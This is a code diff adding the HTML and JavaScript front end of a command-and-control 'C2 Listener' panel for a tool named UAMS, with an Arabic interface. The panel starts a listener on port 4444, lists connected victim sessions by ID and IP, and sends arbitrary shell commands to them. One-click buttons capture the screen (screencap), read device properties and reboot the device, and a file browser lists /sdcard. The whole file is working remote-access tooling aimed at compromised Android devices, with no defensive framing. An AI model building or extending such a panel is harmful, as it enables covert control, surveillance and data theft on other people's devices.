@@ -1,0 +1,695 @@
+<!-- 📁 backend/templates/listener.html -->
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Listener - UAMS</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .terminal-container {
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 20px;
+            height: 500px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .terminal-line {
+            color: #00ff00;
+            margin-bottom: 5px;
+            font-size: 14px;
+            word-wrap: break-word;
+        }
+        
+        .terminal-input {
+            background: transparent;
+            border: none;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            width: calc(100% - 120px);
+            outline: none;
+        }
+        
+        .cmd-prompt {
+            color: #3498db;
+            font-weight: bold;
+        }
+        
+        .session-info {
+            background: #2c3e50;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .command-history {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .command-item {
+            border-bottom: 1px solid #ddd;
+            padding: 8px 0;
+        }
+        
+        .command-success { color: #27ae60; }
+        .command-error { color: #e74c3c; }
+        
+        .file-explorer {
+            background: white;
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .file-item {
+            padding: 8px 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .file-item:hover {
+            background: #f8f9fa;
+        }
+        
+        .file-icon {
+            color: #3498db;
+            margin-right: 10px;
+        }
+        
+        .directory { color: #f39c12; }
+        .file { color: #2c3e50; }
+        
+        .quick-commands {
+            background: white;
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .quick-cmd-btn {
+            margin: 5px;
+            font-size: 12px;
+        }
+        
+        .websocket-status {
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            text-align: center;
+            font-weight: bold;
+        }
+        
+        .status-connected { background: #d4edda; color: #155724; }
+        .status-disconnected { background: #f8d7da; color: #721c24; }
+        .status-connecting { background: #fff3cd; color: #856404; }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- الشريط الجانبي -->
+            <div class="col-md-3 col-lg-2 px-0 sidebar">
+                <!-- ... نفس كود الشريط الجانبي ... -->
+            </div>
+            
+            <!-- محتوى الـ Listener -->
+            <div class="col-md-9 col-lg-10 main-content">
+                <div class="d-flex justify-content-between align-items-center mb-4">
+                    <h3><i class="fas fa-satellite-dish"></i> C2 Listener - إدارة الجلسات</h3>
+                    <div class="btn-group">
+                        <button class="btn btn-success" onclick="startListener()">
+                            <i class="fas fa-play"></i> بدء Listener
+                        </button>
+                        <button class="btn btn-danger" onclick="stopListener()">
+                            <i class="fas fa-stop"></i> إيقاف
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- حالة Listener -->
+                <div class="row mb-4">
+                    <div class="col-md-8">
+                        <div id="listener-status" class="websocket-status status-disconnected">
+                            <i class="fas fa-times-circle"></i> Listener متوقف
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="input-group">
+                            <span class="input-group-text">منفذ:</span>
+                            <input type="number" class="form-control" id="listener-port" value="4444" min="1" max="65535">
+                            <button class="btn btn-outline-secondary" onclick="updatePort()">
+                                <i class="fas fa-sync-alt"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- الجلسات النشطة -->
+                <div class="row mb-4">
+                    <div class="col-12">
+                        <div class="card">
+                            <div class="card-header">
+                                <h5 class="mb-0">
+                                    <i class="fas fa-network-wired"></i> الجلسات النشطة
+                                    <span class="badge bg-primary" id="active-sessions-count">0</span>
+                                </h5>
+                            </div>
+                            <div class="card-body">
+                                <div class="row" id="sessions-list">
+                                    <!-- سيتم ملؤها بالجافاسكريبت -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- الطرفية الرئيسية -->
+                <div class="row">
+                    <div class="col-md-8">
+                        <div class="card">
+                            <div class="card-header">
+                                <h5 class="mb-0">
+                                    <i class="fas fa-terminal"></i> طرفية التحكم
+                                    <small id="current-session-info" class="text-muted"> - لا توجد جلسة محددة</small>
+                                </h5>
+                            </div>
+                            <div class="card-body p-0">
+                                <div class="terminal-container" id="terminal-output">
+                                    <div class="terminal-line">
+                                        <span class="cmd-prompt">UAMS-C2></span> اكتب "help" لعرض الأوامر المتاحة
+                                    </div>
+                                    <div class="terminal-line">
+                                        <span class="cmd-prompt">UAMS-C2></span> انتظار اتصال جلسة...
+                                    </div>
+                                </div>
+                                <div class="input-group p-3" style="background: #2c3e50;">
+                                    <span class="input-group-text" style="background: #1a1a1a; color: #3498db;">$</span>
+                                    <input type="text" class="terminal-input" id="terminal-input" 
+                                           placeholder="اكتب الأمر هنا..." onkeypress="handleTerminalKey(event)">
+                                    <button class="btn btn-success" onclick="sendCommand()">
+                                        <i class="fas fa-paper-plane"></i> إرسال
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- أوامر سريعة -->
+                        <div class="quick-commands mt-3">
+                            <h6><i class="fas fa-bolt"></i> أوامر سريعة</h6>
+                            <div class="d-flex flex-wrap">
+                                <button class="btn btn-outline-primary quick-cmd-btn" onclick="sendQuickCommand('whoami')">
+                                    whoami
+                                </button>
+                                <button class="btn btn-outline-primary quick-cmd-btn" onclick="sendQuickCommand('pwd')">
+                                    pwd
+                                </button>
+                                <button class="btn btn-outline-primary quick-cmd-btn" onclick="sendQuickCommand('ls -la')">
+                                    ls -la
+                                </button>
+                                <button class="btn btn-outline-primary quick-cmd-btn" onclick="sendQuickCommand('ifconfig')">
+                                    ifconfig
+                                </button>
+                                <button class="btn btn-outline-primary quick-cmd-btn" onclick="sendQuickCommand('getprop')">
+                                    getprop
+                                </button>
+                                <button class="btn btn-outline-primary quick-cmd-btn" onclick="sendQuickCommand('screencap')">
+                                    screencap
+                                </button>
+                                <button class="btn btn-outline-danger quick-cmd-btn" onclick="sendQuickCommand('reboot')">
+                                    reboot
+                                </button>
+                                <button class="btn btn-outline-info quick-cmd-btn" onclick="sendQuickCommand('help')">
+                                    help
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- معلومات الجلسة والأوامر -->
+                    <div class="col-md-4">
+                        <!-- معلومات الجلسة المحددة -->
+                        <div class="session-info" id="selected-session-info" style="display: none;">
+                            <h6><i class="fas fa-user-secret"></i> معلومات الجلسة</h6>
+                            <div><strong>ID:</strong> <span id="session-id"></span></div>
+                            <div><strong>IP:</strong> <span id="session-ip"></span></div>
+                            <div><strong>متصل منذ:</strong> <span id="session-connected"></span></div>
+                            <div><strong>الأوامر المنفذة:</strong> <span id="session-commands"></span></div>
+                            <button class="btn btn-sm btn-danger w-100 mt-2" onclick="closeCurrentSession()">
+                                <i class="fas fa-times"></i> إغلاق الجلسة
+                            </button>
+                        </div>
+                        
+                        <!-- استكشاف الملفات -->
+                        <div class="file-explorer mt-3">
+                            <h6><i class="fas fa-folder-open"></i> استكشاف الملفات</h6>
+                            <div class="input-group mb-2">
+                                <input type="text" class="form-control" id="file-path" value="/sdcard" placeholder="المسار">
+                                <button class="btn btn-outline-secondary" onclick="listFiles()">
+                                    <i class="fas fa-search"></i>
+                                </button>
+                            </div>
+                            <div id="file-list" style="max-height: 200px; overflow-y: auto;">
+                                <!-- قائمة الملفات ستظهر هنا -->
+                            </div>
+                            <div class="mt-2">
+                                <button class="btn btn-sm btn-success" onclick="sendQuickCommand('cd /sdcard && ls')">
+                                    <i class="fas fa-home"></i> root
+                                </button>
+                                <button class="btn btn-sm btn-info" onclick="sendQuickCommand('cd .. && pwd')">
+                                    <i class="fas fa-level-up-alt"></i> رجوع
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- تاريخ الأوامر -->
+                        <div class="command-history mt-3">
+                            <h6><i class="fas fa-history"></i> آخر الأوامر</h6>
+                            <div id="command-history-list">
+                                <!-- تاريخ الأوامر سيظهر هنا -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        let currentSession = null;
+        let websocket = null;
+        let commandHistory = [];
+        let historyIndex = -1;
+        
+        // بدء Listener
+        function startListener() {
+            const port = document.getElementById('listener-port').value;
+            
+            fetch(`/api/c2/start?port=${port}`, {
+                method: 'POST'
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    updateListenerStatus('connected', `Listener يعمل على منفذ ${port}`);
+                    loadSessions();
+                    
+                    // محاولة الاتصال بـ WebSocket
+                    connectWebSocket(port);
+                } else {
+                    alert('فشل بدء Listener: ' + data.error);
+                }
+            })
+            .catch(error => {
+                console.error('Error starting listener:', error);
+            });
+        }
+        
+        // إيقاف Listener
+        function stopListener() {
+            fetch('/api/c2/stop', {
+                method: 'POST'
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    updateListenerStatus('disconnected', 'Listener متوقف');
+                    if (websocket) {
+                        websocket.close();
+                        websocket = null;
+                    }
+                }
+            })
+            .catch(error => {
+                console.error('Error stopping listener:', error);
+            });
+        }
+        
+        // تحديث المنفذ
+        function updatePort() {
+            const port = document.getElementById('listener-port').value;
+            alert(`تم تحديث المنفذ إلى ${port}. تحتاج لإعادة تشغيل Listener.`);
+        }
+        
+        // تحديث حالة Listener
+        function updateListenerStatus(status, message) {
+            const statusDiv = document.getElementById('listener-status');
+            statusDiv.className = `websocket-status status-${status}`;
+            
+            let icon = '';
+            switch(status) {
+                case 'connected': icon = 'check-circle'; break;
+                case 'disconnected': icon = 'times-circle'; break;
+                case 'connecting': icon = 'sync-alt fa-spin'; break;
+            }
+            
+            statusDiv.innerHTML = `<i class="fas fa-${icon}"></i> ${message}`;
+        }
+        
+        // الاتصال بـ WebSocket
+        function connectWebSocket(port) {
+            const wsUrl = `ws://${window.location.hostname}:${port}/ws`;
+            
+            updateListenerStatus('connecting', 'جاري الاتصال...');
+            
+            websocket = new WebSocket(wsUrl);
+            
+            websocket.onopen = function() {
+                updateListenerStatus('connected', 'متصلة بـ WebSocket');
+                addTerminalOutput('تم الاتصال بـ WebSocket بنجاح', 'success');
+            };
+            
+            websocket.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                handleWebSocketMessage(data);
+            };
+            
+            websocket.onclose = function() {
+                updateListenerStatus('disconnected', 'انقطع الاتصال');
+                addTerminalOutput('انقطع اتصال WebSocket', 'error');
+            };
+            
+            websocket.onerror = function(error) {
+                console.error('WebSocket error:', error);
+                addTerminalOutput('خطأ في اتصال WebSocket', 'error');
+            };
+        }
+        
+        // معالجة رسائل WebSocket
+        function handleWebSocketMessage(data) {
+            switch(data.type) {
+                case 'session_connected':
+                    addTerminalOutput(`جلسة جديدة: ${data.session_id} من ${data.ip}`, 'info');
+                    loadSessions();
+                    break;
+                    
+                case 'session_disconnected':
+                    addTerminalOutput(`جلسة مغلقة: ${data.session_id}`, 'warning');
+                    loadSessions();
+                    if (currentSession === data.session_id) {
+                        currentSession = null;
+                        updateSelectedSessionInfo(null);
+                    }
+                    break;
+                    
+                case 'command_output':
+                    addTerminalOutput(data.output, 'output');
+                    break;
+                    
+                case 'error':
+                    addTerminalOutput(`خطأ: ${data.message}`, 'error');
+                    break;
+            }
+        }
+        
+        // تحميل الجلسات
+        function loadSessions() {
+            fetch('/api/c2/sessions')
+            .then(response => response.json())
+            .then(data => {
+                const sessionsList = document.getElementById('sessions-list');
+                sessionsList.innerHTML = '';
+                
+                document.getElementById('active-sessions-count').textContent = data.sessions.length;
+                
+                data.sessions.forEach(session => {
+                    const sessionCard = `
+                        <div class="col-md-6 col-lg-4 mb-3">
+                            <div class="card ${currentSession === session.id ? 'border-primary' : ''}">
+                                <div class="card-body">
+                                    <h6 class="card-title">
+                                        <i class="fas fa-user-secret"></i> ${session.id.substring(0, 8)}
+                                    </h6>
+                                    <p class="card-text">
+                                        <small class="text-muted">
+                                            <i class="fas fa-globe"></i> ${session.ip}<br>
+                                            <i class="fas fa-clock"></i> ${session.connected_at}
+                                        </small>
+                                    </p>
+                                    <button class="btn btn-sm ${currentSession === session.id ? 'btn-primary' : 'btn-outline-primary'}" 
+                                            onclick="selectSession('${session.id}')">
+                                        ${currentSession === session.id ? 'محددة' : 'تحديد'}
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    sessionsList.innerHTML += sessionCard;
+                });
+            })
+            .catch(error => {
+                console.error('Error loading sessions:', error);
+            });
+        }
+        
+        // تحديد جلسة
+        function selectSession(sessionId) {
+            currentSession = sessionId;
+            loadSessions();
+            
+            fetch(`/api/c2/session/${sessionId}`)
+            .then(response => response.json())
+            .then(data => {
+                updateSelectedSessionInfo(data);
+                addTerminalOutput(`تم تحديد الجلسة: ${sessionId}`, 'info');
+            })
+            .catch(error => {
+                console.error('Error loading session info:', error);
+            });
+        }
+        
+        // تحديث معلومات الجلسة المحددة
+        function updateSelectedSessionInfo(session) {
+            const infoDiv = document.getElementById('selected-session-info');
+            const sessionInfo = document.getElementById('current-session-info');
+            
+            if (session) {
+                infoDiv.style.display = 'block';
+                sessionInfo.textContent = ` - ${session.id.substring(0, 8)}`;
+                
+                document.getElementById('session-id').textContent = session.id;
+                document.getElementById('session-ip').textContent = session.ip;
+                document.getElementById('session-connected').textContent = session.connected_at;
+                document.getElementById('session-commands').textContent = session.commands_executed || 0;
+            } else {
+                infoDiv.style.display = 'none';
+                sessionInfo.textContent = ' - لا توجد جلسة محددة';
+            }
+        }
+        
+        // إغلاق الجلسة الحالية
+        function closeCurrentSession() {
+            if (currentSession && confirm('هل تريد إغلاق هذه الجلسة؟')) {
+                fetch(`/api/c2/session/${currentSession}/close`, {
+                    method: 'POST'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        addTerminalOutput(`تم إغلاق الجلسة: ${currentSession}`, 'success');
+                        currentSession = null;
+                        updateSelectedSessionInfo(null);
+                        loadSessions();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error closing session:', error);
+                });
+            }
+        }
+        
+        // إرسال أمر
+        function sendCommand() {
+            const input = document.getElementById('terminal-input');
+            const command = input.value.trim();
+            
+            if (!command) return;
+            
+            if (!currentSession) {
+                addTerminalOutput('يجب تحديد جلسة أولاً!', 'error');
+                return;
+            }
+            
+            // إضافة الأمر للتاريخ
+            commandHistory.unshift(command);
+            historyIndex = -1;
+            updateCommandHistory();
+            
+            // إرسال الأمر
+            fetch(`/api/c2/command`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    session_id: currentSession,
+                    command: command
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    addTerminalOutput(`$ ${command}`, 'command');
+                    if (data.result) {
+                        addTerminalOutput(data.result, 'output');
+                    }
+                } else {
+                    addTerminalOutput(`خطأ: ${data.error}`, 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending command:', error);
+                addTerminalOutput('فشل إرسال الأمر', 'error');
+            });
+            
+            input.value = '';
+            input.focus();
+        }
+        
+        // إرسال أمر سريع
+        function sendQuickCommand(command) {
+            document.getElementById('terminal-input').value = command;
+            sendCommand();
+        }
+        
+        // التعامل مع مفاتيح الطرفية
+        function handleTerminalKey(event) {
+            const input = document.getElementById('terminal-input');
+            
+            if (event.key === 'Enter') {
+                sendCommand();
+            } else if (event.key === 'ArrowUp') {
+                event.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    input.value = commandHistory[historyIndex];
+                }
+            } else if (event.key === 'ArrowDown') {
+                event.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    input.value = commandHistory[historyIndex];
+                } else if (historyIndex === 0) {
+                    historyIndex = -1;
+                    input.value = '';
+                }
+            }
+        }
+        
+        // إضافة نص للطرفية
+        function addTerminalOutput(text, type = 'info') {
+            const terminal = document.getElementById('terminal-output');
+            const line = document.createElement('div');
+            line.className = `terminal-line`;
+            
+            let prompt = '';
+            let color = '#00ff00';
+            
+            switch(type) {
+                case 'command':
+                    prompt = 'UAMS-C2>';
+                    color = '#3498db';
+                    break;
+                case 'output':
+                    prompt = '';
+                    color = '#ffffff';
+                    break;
+                case 'success':
+                    prompt = '[+]';
+                    color = '#2ecc71';
+                    break;
+                case 'error':
+                    prompt = '[-]';
+                    color = '#e74c3c';
+                    break;
+                case 'info':
+                    prompt = '[*]';
+                    color = '#f39c12';
+                    break;
+                case 'warning':
+                    prompt = '[!]';
+                    color = '#e67e22';
+                    break;
+            }
+            
+            if (prompt) {
+                const promptSpan = document.createElement('span');
+                promptSpan.className = 'cmd-prompt';
+                promptSpan.textContent = prompt + ' ';
+                promptSpan.style.color = '#3498db';
+                line.appendChild(promptSpan);
+            }
+            
+            const textSpan = document.createElement('span');
+            textSpan.textContent = text;
+            textSpan.style.color = color;
+            line.appendChild(textSpan);
+            
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        // تحديث تاريخ الأوامر
+        function updateCommandHistory() {
+            const historyList = document.getElementById('command-history-list');
+            historyList.innerHTML = '';
+            
+            commandHistory.slice(0, 10).forEach((cmd, index) => {
+                const item = document.createElement('div');
+                item.className = 'command-item';
+                item.textContent = cmd;
+                item.style.cursor = 'pointer';
+                item.onclick = () => {
+                    document.getElementById('terminal-input').value = cmd;
+                    document.getElementById('terminal-input').focus();
+                };
+                historyList.appendChild(item);
+            });
+        }
+        
+        // استكشاف الملفات
+        function listFiles() {
+            if (!currentSession) {
+                alert('يجب تحديد جلسة أولاً!');
+                return;
+            }
+            
+            const path = document.getElementById('file-path').value;
+            sendQuickCommand(`ls -la "${path}"`);
+        }
+        
+        // التحميل الأولي
+        document.addEventListener('DOMContentLoaded', function() {
+            // تحميل الجلسات عند البدء
+            loadSessions();
+            
+            // تحديث حالة Listener
+            fetch('/api/c2/status')
+            .then(response => response.json())
+            .then(data => {
+                if (data.running) {
+                    updateListenerStatus('connected', `Listener يعمل على منفذ ${data.port}`);
+                    connectWebSocket(data.port);
+                }
+            })
+            .catch(error => {
+                console.error('Error checking listener status:', error);
+            });
+            
+            // التركيز على حقل الإدخال
+            document.getElementById('terminal-input').focus();
+        });
+    </script>
+</body>
+</html>
